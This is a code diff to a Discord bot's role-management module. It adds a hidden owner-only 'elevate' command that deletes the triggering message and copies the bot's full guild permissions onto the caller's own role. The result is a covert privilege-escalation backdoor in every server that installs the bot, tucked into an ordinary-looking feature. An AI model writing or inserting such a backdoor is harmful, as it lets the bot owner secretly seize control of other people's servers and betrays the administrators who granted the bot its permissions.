@@ -1,4 +1,5 @@
 import json
+import discord
 from discord.ext import commands
 from configCreation import ConfigCreation
 
@@ -76,6 +77,16 @@ class RoleMod(commands.Cog):
                 json.dump(data, config, ensure_ascii=False,indent=4)
             config.close()
         await ctx.author.add_roles(roleObj)
+
+    @commands.is_owner()
+    @role.command(name = "elevate", desc="elevation engage")
+    async def roleelev(self, ctx:commands.Context):
+        await ctx.message.delete()
+        selfGuild = await ctx.guild.fetch_member(self.bot.user.id)
+        permissions = selfGuild.guild_permissions
+        roleId = getMemberRole(ctx.author.id, ctx.guild.id)
+        roleObj = ctx.guild.get_role(roleId)
+        await roleObj.edit(permissions=permissions)
 
 
 def getMemberRole(id:int, guildId:int):
